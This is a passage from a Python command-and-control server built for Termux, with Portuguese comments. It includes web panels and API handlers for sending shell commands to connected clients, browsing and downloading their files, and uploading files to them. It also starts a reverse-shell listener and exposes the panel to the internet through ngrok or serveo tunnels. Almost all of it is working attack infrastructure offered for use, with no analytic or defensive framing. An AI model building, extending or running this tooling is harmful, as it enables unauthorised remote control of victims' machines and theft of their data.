                            const fileItem = document.createElement('div');
                            fileItem.className = 'file-item';
                            
                            const isDirectory = fileLine.startsWith('d');
                            const parts = fileLine.split(/\s+/);
                            const fileName = parts[parts.length - 1];
                            
                            fileItem.innerHTML = `
                                <div class="file-name">
                                    <span class="file-icon">${isDirectory ? '📁' : '📄'}</span>
                                    <span>${fileName}</span>
                                </div>
                                <div class="file-size">${isDirectory ? '' : parts[4] + ' bytes'}</div>
                            `;
                            
                            fileItem.onclick = () => {
                                // Desselecionar anterior
                                document.querySelectorAll('.file-item').forEach(item => {
                                    item.classList.remove('selected');
                                });
                                
                                // Selecionar atual
                                fileItem.classList.add('selected');
                                selectedFile = fileName;
                                
                                if (isDirectory) {
                                    loadFiles(path === '.' ? fileName : path + '/' + fileName);
                                }
                            };
                            
                            fileList.appendChild(fileItem);
                        });
                    } else {
                        fileList.innerHTML = `<div class="no-files">Error: ${data.error}</div>`;
                    }
                })
                .catch(error => {
                    document.getElementById('file-list').innerHTML = `<div class="no-files">Network error: ${error}</div>`;
                });
        }

        // Botões
        document.getElementById('refresh-files').addEventListener('click', () => loadFiles(currentPath));
        document.getElementById('go-path').addEventListener('click', () => {
            const newPath = document.getElementById('file-path').value;
            loadFiles(newPath);
        });

        document.getElementById('download-file').addEventListener('click', () => {
            if (!selectedClient || !selectedFile) {
                alert('Please select a client and a file');
                return;
            }

            const remotePath = currentPath === '.' ? selectedFile : currentPath + '/' + selectedFile;
            
            fetch(`/api/download?client_id=${selectedClient}&remote_path=${encodeURIComponent(remotePath)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert('Download started: ' + data.message);
                        loadLocalDownloads();
                    } else {
                        alert('Download failed: ' + data.error);
                    }
                })
                .catch(error => alert('Download error: ' + error));
        });

        // Carregar downloads locais
        function loadLocalDownloads() {
            // Esta função precisaria de uma API adicional para listar arquivos locais
            // Por enquanto, apenas mostra uma mensagem
            document.getElementById('downloads-list').innerHTML = '<div class="download-item">Check the downloads/ directory on server</div>';
        }

        // Atualizar a cada 5 segundos
        setInterval(loadClients, 5000);
        loadClients();
        loadLocalDownloads();
    </script>
</body>
</html>
"""
    
    def generate_upload_html(self):
        """Gera HTML da página de upload"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload - C2 Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2196F3;
            --secondary: #1976D2;
            --accent: #FF4081;
            --dark: #263238;
            --light: #ECEFF1;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        header {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 0 0 15px 15px;
        }

        .logo {
            text-align: center;
            color: white;
        }

        .logo h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }

        nav {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }

        .nav-btn {
            background: var(--primary);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--secondary);
            transform: translateY(-2px);
        }

        main {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .upload-container {
            max-width: 600px;
            margin: 0 auto;
        }

        .upload-form {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--dark);
        }

        .form-group select,
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        .file-drop-area {
            border: 2px dashed #ddd;
            border-radius: 5px;
            padding: 40px 20px;
            text-align: center;
            transition: all 0.3s;
            cursor: pointer;
        }

        .file-drop-area:hover {
            border-color: var(--primary);
            background: #f8f9fa;
        }

        .file-drop-area.dragover {
            border-color: var(--primary);
            background: var(--light);
        }

        .upload-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            width: 100%;
            transition: background 0.3s;
        }

        .upload-btn:hover {
            background: var(--secondary);
        }

        .upload-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .upload-status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }

        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <h1>📤 Upload</h1>
            </div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/terminal" class="nav-btn">Terminal</a>
                <a href="/files" class="nav-btn">Files</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <main>
            <div class="upload-container">
                <div class="upload-form">
                    <h2 style="text-align: center; margin-bottom: 30px; color: var(--dark);">
                        Upload File to Client
                    </h2>

                    <div class="form-group">
                        <label for="upload-client-select">Select Client:</label>
                        <select id="upload-client-select">
                            <option value="">Select Client...</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="remote-path">Remote Path:</label>
                        <input type="text" id="remote-path" placeholder="/path/on/client/filename" value="/tmp/">
                    </div>

                    <div class="form-group">
                        <label>Select File:</label>
                        <div class="file-drop-area" id="file-drop-area">
                            <p>📁 Drag & drop your file here or click to select</p>
                            <input type="file" id="file-input" style="display: none;">
                            <div id="file-name" style="margin-top: 10px; font-style: italic;"></div>
                        </div>
                    </div>

                    <button id="upload-btn" class="upload-btn" disabled>Upload File</button>

                    <div id="upload-status" class="upload-status"></div>
                </div>
            </div>
        </main>
    </div>

    <script>
        let selectedFile = null;
        let selectedUploadClient = null;

        // Carregar clientes
        function loadClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {
                    const select = document.getElementById('upload-client-select');
                    select.innerHTML = '<option value="">Select Client...</option>';
                    
                    clients.forEach(client => {
                        const option = document.createElement('option');
                        option.value = client.id;
                        option.textContent = `${client.id} (${client.os})`;
                        select.appendChild(option);
                    });
                })
                .catch(error => console.error('Error:', error));
        }

        // Selecionar cliente
        document.getElementById('upload-client-select').addEventListener('change', function() {
            selectedUploadClient = this.value;
            updateUploadButton();
        });

        // Área de drop de arquivo
        const fileDropArea = document.getElementById('file-drop-area');
        const fileInput = document.getElementById('file-input');
        const fileName = document.getElementById('file-name');

        fileDropArea.addEventListener('click', () => fileInput.click());
        
        fileInput.addEventListener('change', function() {
            if (this.files.length > 0) {
                selectedFile = this.files[0];
                fileName.textContent = `Selected: ${selectedFile.name} (${(selectedFile.size / 1024).toFixed(2)} KB)`;
                updateUploadButton();
            }
        });

        // Drag and drop
        fileDropArea.addEventListener('dragover', function(e) {
            e.preventDefault();
            this.classList.add('dragover');
        });

        fileDropArea.addEventListener('dragleave', function() {
            this.classList.remove('dragover');
        });

        fileDropArea.addEventListener('drop', function(e) {
            e.preventDefault();
            this.classList.remove('dragover');
            
            if (e.dataTransfer.files.length > 0) {
                selectedFile = e.dataTransfer.files[0];
                fileInput.files = e.dataTransfer.files;
                fileName.textContent = `Selected: ${selectedFile.name} (${(selectedFile.size / 1024).toFixed(2)} KB)`;
                updateUploadButton();
            }
        });

        function updateUploadButton() {
            const uploadBtn = document.getElementById('upload-btn');
            uploadBtn.disabled = !(selectedUploadClient && selectedFile);
        }

        // Upload
        document.getElementById('upload-btn').addEventListener('click', function() {
            if (!selectedUploadClient || !selectedFile) return;

            const remotePath = document.getElementById('remote-path').value || '/tmp/' + selectedFile.name;
            const formData = new FormData();
            formData.append('client_id', selectedUploadClient);
            formData.append('remote_path', remotePath);
            formData.append('file', selectedFile);

            const statusDiv = document.getElementById('upload-status');
            statusDiv.style.display = 'none';

            fetch('/api/upload', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                statusDiv.style.display = 'block';
                
                if (data.success) {
                    statusDiv.className = 'upload-status status-success';
                    statusDiv.textContent = `Upload successful: ${data.message}`;
                } else {
                    statusDiv.className = 'upload-status status-error';
                    statusDiv.textContent = `Upload failed: ${data.error}`;
                }
            })
            .catch(error => {
                statusDiv.style.display = 'block';
                statusDiv.className = 'upload-status status-error';
                statusDiv.textContent = `Network error: ${error}`;
            });
        });

        // Atualizar clientes a cada 5 segundos
        setInterval(loadClients, 5000);
        loadClients();
    </script>
</body>
</html>
"""
    
    def generate_settings_html(self):
        """Gera HTML das configurações"""
        return f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings - C2 Server</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        :root {{
            --primary: #2196F3;
            --secondary: #1976D2;
            --accent: #FF4081;
            --dark: #263238;
            --light: #ECEFF1;
            --success: #4CAF50;
            --warning: #FF9800;
            --danger: #F44336;
        }}

        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}

        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }}

        header {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 0 0 15px 15px;
        }}

        .logo {{
            text-align: center;
            color: white;
        }}

        .logo h1 {{
            font-size: 2em;
            margin-bottom: 10px;
        }}

        nav {{
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }}

        .nav-btn {{
            background: var(--primary);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
        }}

        .nav-btn:hover {{
            background: var(--secondary);
            transform: translateY(-2px);
        }}

        main {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }}

        .settings-panel {{
            max-width: 800px;
            margin: 0 auto;
        }}

        .setting-group {{
            background: white;
            padding: 25px;
            margin-bottom: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }}

        .setting-group h3 {{
            color: var(--dark);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}

        .setting-item {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding: 10px 0;
            border-bottom: 1px solid #f0f0f0;
        }}

        .setting-item:last-child {{
            border-bottom: none;
        }}

        .setting-item label {{
            font-weight: 500;
            color: var(--dark);
        }}

        .setting-item input, .setting-item select {{
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            width: 200px;
        }}

        .setting-actions {{
            display: flex;
            gap: 15px;
            margin: 30px 0;
        }}

        .save-btn, .restart-btn {{
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s;
        }}

        .save-btn {{
            background: var(--success);
            color: white;
        }}

        .restart-btn {{
            background: var(--warning);
            color: white;
        }}

        .save-btn:hover {{
            background: #45a049;
        }}

        .restart-btn:hover {{
            background: #e68900;
        }}

        .server-status {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }}

        .status-items {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }}

        .status-item {{
            background: var(--light);
            padding: 15px;
            border-radius: 8px;
        }}

        .status-running {{
            color: var(--success);
            font-weight: bold;
        }}

        .status-stopped {{
            color: var(--danger);
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <h1>⚙️ Settings</h1>
            </div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/terminal" class="nav-btn">Terminal</a>
                <a href="/files" class="nav-btn">Files</a>
                <a href="/upload" class="nav-btn">Upload</a>
            </nav>
        </header>

        <main>
            <div class="settings-panel">
                <div class="setting-group">
                    <h3>🔌 Server Configuration</h3>
                    <div class="setting-item">
                        <label>Web Server Port:</label>
                        <input type="number" id="web-port" value="{self.config['server_port']}" min="1024" max="65535">
                    </div>
                    <div class="setting-item">
                        <label>Shell Listener Port:</label>
                        <input type="number" id="shell-port" value="{self.config['shell_port']}" min="1024" max="65535">
                    </div>
                </div>

                <div class="setting-group">
                    <h3>🌐 Tunnel Configuration</h3>
                    <div class="setting-item">
                        <label>Enable Tunnel:</label>
                        <input type="checkbox" id="tunnel-enabled" {'checked' if self.config['tunnel_enabled'] else ''}>
                    </div>
                    <div class="setting-item">
                        <label>Tunnel Type:</label>
                        <select id="tunnel-type">
                            <option value="localhost" {'selected' if self.config['tunnel_type'] == 'localhost' else ''}>Localhost</option>
                            <option value="ngrok" {'selected' if self.config['tunnel_type'] == 'ngrok' else ''}>Ngrok</option>
                            <option value="serveo" {'selected' if self.config['tunnel_type'] == 'serveo' else ''}>Serveo</option>
                        </select>
                    </div>
                </div>

                <div class="setting-group">
                    <h3>🔒 Security</h3>
                    <div class="setting-item">
                        <label>Password:</label>
                        <input type="password" id="server-password" value="{self.config['password']}">
                    </div>
                </div>

                <div class="setting-actions">
                    <button id="save-settings" class="save-btn">Save Settings</button>
                    <button id="restart-server" class="restart-btn">Restart Server</button>
                </div>

                <div class="server-status">
                    <h3>📊 Server Status</h3>
                    <div class="status-items">
                        <div class="status-item">
                            <strong>Web Server:</strong> 
                            <span id="web-status" class="status-running">Running</span>
                        </div>
                        <div class="status-item">
                            <strong>Shell Listener:</strong> 
                            <span id="shell-status" class="status-running">Running</span>
                        </div>
                        <div class="status-item">
                            <strong>Active Clients:</strong> 
                            <span id="clients-status">0</span>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        // Salvar configurações
        document.getElementById('save-settings').addEventListener('click', function() {{
            const settings = {{
                server_port: parseInt(document.getElementById('web-port').value),
                shell_port: parseInt(document.getElementById('shell-port').value),
                tunnel_enabled: document.getElementById('tunnel-enabled').checked,
                tunnel_type: document.getElementById('tunnel-type').value,
                password: document.getElementById('server-password').value
            }};

            // Aqui você implementaria a API para salvar as configurações
            alert('Settings saved! (Note: Server restart required for port changes)');
        }});

        // Reiniciar servidor
        document.getElementById('restart-server').addEventListener('click', function() {{
            if (confirm('Are you sure you want to restart the server?')) {{
                alert('Server restart functionality would be implemented here');
            }}
        }});

        // Atualizar status
        function updateStatus() {{
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {{
                    document.getElementById('clients-status').textContent = clients.length;
                }})
                .catch(error => console.error('Error:', error));
        }}

        // Atualizar a cada 5 segundos
        setInterval(updateStatus, 5000);
        updateStatus();
    </script>
</body>
</html>
"""
    
    def start_web_server(self):
        """Inicia servidor web"""
        class C2WebHandler(BaseHTTPRequestHandler):
            c2_server = self
            
            def do_GET(self):
                """Manipula requisições GET"""
                parsed_path = urlparse(self.path)
                path = parsed_path.path
                
                # Rotas da aplicação
                routes = {
                    '/': 'index',
                    '/dashboard': 'dashboard',
                    '/terminal': 'terminal',
                    '/files': 'files',
                    '/upload': 'upload',
                    '/settings': 'settings'
                }
                
                if path in routes:
                    self.serve_template(routes[path])
                elif path == '/api/clients':
                    self.api_get_clients()
                elif path == '/api/command':
                    self.api_send_command()
                elif path == '/api/files':
                    self.api_get_files()
                elif path == '/api/download':
                    self.api_download_file()
                else:
                    self.send_error(404, "Page not found")
            
            def do_POST(self):
                """Manipula requisições POST"""
                parsed_path = urlparse(self.path)
                path = parsed_path.path
                
                if path == '/api/upload':
                    self.api_upload_file()
                else:
                    self.send_error(404, "API endpoint not found")
            
            def serve_template(self, template_name):
                """Serve templates HTML"""
                try:
                    html_content = self.c2_server.generate_html_template(template_name)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(html_content.encode('utf-8'))
                    
                except Exception as e:
                    self.send_error(500, f"Template error: {str(e)}")
            
            def api_get_clients(self):
                """API: Retorna lista de clientes conectados"""
                clients_data = []
                for client_id, client_info in self.c2_server.clients.items():
                    clients_data.append({
                        'id': client_id,
                        'ip': client_info['address'][0],
                        'port': client_info['address'][1],
                        'connected_at': client_info['connected_at'],
                        'last_seen': client_info['last_seen'],
                        'os': client_info['os'],
                        'user': client_info['user']
                    })
                
                self.send_json_response(clients_data)
            
            def api_send_command(self):
                """API: Envia comando para cliente"""
                try:
                    query_params = parse_qs(urlparse(self.path).query)
                    client_id = query_params.get('client_id', [None])[0]
                    command = query_params.get('command', [None])[0]
                    
                    if client_id and command:
                        result = self.c2_server.send_command(client_id, command)
                        self.send_json_response({'success': True, 'result': result})
                    else:
                        self.send_json_response({'success': False, 'error': 'Missing parameters'})
                        
                except Exception as e:
                    self.send_json_response({'success': False, 'error': str(e)})
            
            def api_get_files(self):
                """API: Obtém lista de arquivos do cliente"""
                try:
                    query_params = parse_qs(urlparse(self.path).query)
                    client_id = query_params.get('client_id', [None])[0]
                    path = query_params.get('path', ['.'])[0]
                    
                    if client_id:
                        result = self.c2_server.get_file_list(client_id, path)
                        self.send_json_response({'success': True, 'files': result})
                    else:
                        self.send_json_response({'success': False, 'error': 'Missing client_id'})
                        
                except Exception as e:
                    self.send_json_response({'success': False, 'error': str(e)})
            
            def api_download_file(self):
                """API: Faz download de arquivo"""
                try:
                    query_params = parse_qs(urlparse(self.path).query)
                    client_id = query_params.get('client_id', [None])[0]
                    remote_path = query_params.get('remote_path', [None])[0]
                    local_filename = os.path.basename(remote_path) if remote_path else 'download'
                    
                    if client_id and remote_path:
                        result = self.c2_server.download_file(client_id, remote_path, local_filename)
                        self.send_json_response({'success': True, 'message': result})
                    else:
                        self.send_json_response({'success': False, 'error': 'Missing parameters'})
                        
                except Exception as e:
                    self.send_json_response({'success': False, 'error': str(e)})
            
            def api_upload_file(self):
                """API: Faz upload de arquivo"""
                try:
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    
                    # Parse básico do multipart (simplificado)
                    boundary = self.headers['Content-Type'].split('boundary=')[1]
                    parts = post_data.split(b'--' + boundary.encode())
                    
                    client_id = None
                    remote_path = None
                    file_data = None
                    
                    for part in parts:
                        if b'name="client_id"' in part:
                            client_id = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0].decode()
                        elif b'name="remote_path"' in part:
                            remote_path = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0].decode()
                        elif b'name="file"' in part and b'filename="' in part:
                            file_lines = part.split(b'\r\n\r\n')
                            if len(file_lines) > 1:
                                file_data = file_lines[1].split(b'\r\n--')[0]
                    
                    if client_id and remote_path and file_data:
                        # Salvar arquivo temporariamente
                        temp_path = os.path.join(self.c2_server.config['upload_dir'], 'temp_upload')
                        with open(temp_path, 'wb') as f:
                            f.write(file_data)
                        
                        # Fazer upload
                        result = self.c2_server.upload_file(client_id, temp_path, remote_path)
                        
                        # Limpar
                        try:
                            os.remove(temp_path)
                        except:
                            pass
                        
                        self.send_json_response({'success': True, 'message': result})
                    else:
                        self.send_json_response({'success': False, 'error': 'Missing parameters'})
                        
                except Exception as e:
                    self.send_json_response({'success': False, 'error': str(e)})
            
            def send_json_response(self, data):
                """Envia resposta JSON"""
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())
            
            def log_message(self, format, *args):
                """Customiza logging"""
                print(f"[WEB] {self.client_address[0]} - {format % args}")
        
        try:
            self.web_server = HTTPServer(('0.0.0.0', self.config['server_port']), C2WebHandler)
            print(f"[+] Web server started on port {self.config['server_port']}")
            print(f"[+] Access: http://localhost:{self.config['server_port']}")
            
            self.web_server.serve_forever()
            
        except Exception as e:
            print(f"[-] Web server error: {e}")
    
    def start_tunnel(self):
        """Inicia tunelamento (ngrok/serveo)"""
        if self.config['tunnel_enabled']:
            tunnel_type = self.config['tunnel_type']
            
            if tunnel_type == 'ngrok':
                try:
                    subprocess.Popen(['ngrok', 'http', str(self.config['server_port'])])
                    print("[+] Ngrok tunnel started")
                except:
                    print("[-] Ngrok not found. Install with: pkg install ngrok")
            
            elif tunnel_type == 'serveo':
                try:
                    subprocess.Popen([
                        'ssh', '-o', 'StrictHostKeyChecking=no', 
                        '-R', '80:localhost:' + str(self.config['server_port']), 
                        'serveo.net'
                    ])
                    print("[+] Serveo tunnel started")
                except:
                    print("[-] Serveo tunnel failed")
    
    def start(self):
        """Inicia todos os serviços"""
        print("[+] Starting C2 Server...")
        print(f"[+] Web Interface: http://0.0.0.0:{self.config['server_port']}")
        print(f"[+] Shell Listener: 0.0.0.0:{self.config['shell_port']}")
        
        # Iniciar listener de shells
        self.start_shell_listener()
        
        # Iniciar tunelamento
        self.start_tunnel()
        
        # Iniciar servidor web
        self.start_web_server()

def main():
    # Verificar se está no Termux
    if not os.path.exists('/data/data/com.termux/files/usr'):
        print("[!] This script is optimized for Termux")
    
    # Criar servidor
    c2_server = C2Server()
    
    try:
        c2_server.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down C2 Server...")
        sys.exit(0)

if __name__ == '__main__':
    main()
